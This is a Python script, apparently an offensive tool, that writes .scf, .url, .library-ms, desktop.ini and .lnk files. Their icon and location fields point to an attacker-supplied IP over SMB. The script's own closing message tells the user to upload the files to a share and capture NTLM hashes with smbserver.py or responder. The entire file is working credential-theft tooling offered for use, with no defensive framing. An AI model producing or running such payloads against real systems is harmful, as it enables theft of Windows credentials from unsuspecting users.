import argparse
import random
import os
from time import sleep
from pylnk3 import Lnk

scf = '''
[Shell]
Command=2
IconFile=\\\\{}\\x\\{}.ico
[Taskbar]
Command=ToggleDesktop
'''

url = '''
[InternetShortcut]
URL=http://{}/x/{}.html
IconIndex=1
IconFile=\\\\{}\\x\\{}.ico
'''

lib = '''
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="<http://schemas.microsoft.com/windows/2009/library>">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType><§7d49d726-3c21-4f05-99aa-fdc2c9474656§></folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>\\\\{}\\x\\{}</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
'''

ini = '''
[.ShellClassInfo]
IconResource=\\\\{}\\x\\{}
IconIndex={}
'''


def generate(ip, out):
    print("[*] Generating hash grabbing files..")
    # scf
    scf_payload = scf.format(ip, f"scf_{random.randint(0, 1000)}")
    fname = f'@{out}.scf'
    with open(fname, 'w+') as f:
        f.write(scf_payload)
        print(f"[*] Written {fname}")
    
    # url
    url_payload = url.format(ip, f"url_{random.randint(0, 1000)}", ip, f"url_{random.randint(0, 1000)}")
    fname = f'@{out}.url'
    with open(fname, 'w+') as f:
        f.write(url_payload)
        print(f"[*] Written {fname}")

    # library-ms
    lib_payload = lib.format(ip, f"library-ms_{random.randint(0, 1000)}", ip, f"library-ms_{random.randint(0, 1000)}")
    lib_payload = lib_payload.replace("<§","{").replace("§>","}")
    fname = f'{out}.library-ms'
    with open(fname, 'w+') as f:
        f.write(lib_payload)
        print(f"[*] Written {fname}")

    # ini
    ini_payload = ini.format(ip, f"ini_{random.randint(0, 1000)}", ip, f"ini_{random.randint(0, 1000)}", f"{random.randint(0, 1000)}")
    fname = f'desktop.ini'
    with open(fname, 'w+') as f:
        f.write(ini_payload)
        print(f"[*] Written {fname}")

    # lnk
    skeleton_path = f"{os.path.dirname(os.path.abspath(__file__))}/skel"
    fname =f"lnk_{random.randint(0, 1000)}.ico"
    path = f"pylnk3 c \\\\\\\\{ip}\\\\x\\\\{fname} {skeleton_path}.lnk"
    os.system(path)
    sleep(1)
    lnk = Lnk(skeleton_path)
    lnk.icon = f'\\\\{ip}\\x\\{fname}'
    lnk.save(f'{out}.lnk')
    print(f"[*] Written {fname}")
    print("[+] Done, upload files to smb share and capture hashes with smbserver.py/responder")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='create hash grabbing payloads')
    parser.add_argument('ip',  type=str, help='attacker ip')
    parser.add_argument('out',  type=str, help='output name')
    args = parser.parse_args()
    generate(args.ip, args.out)
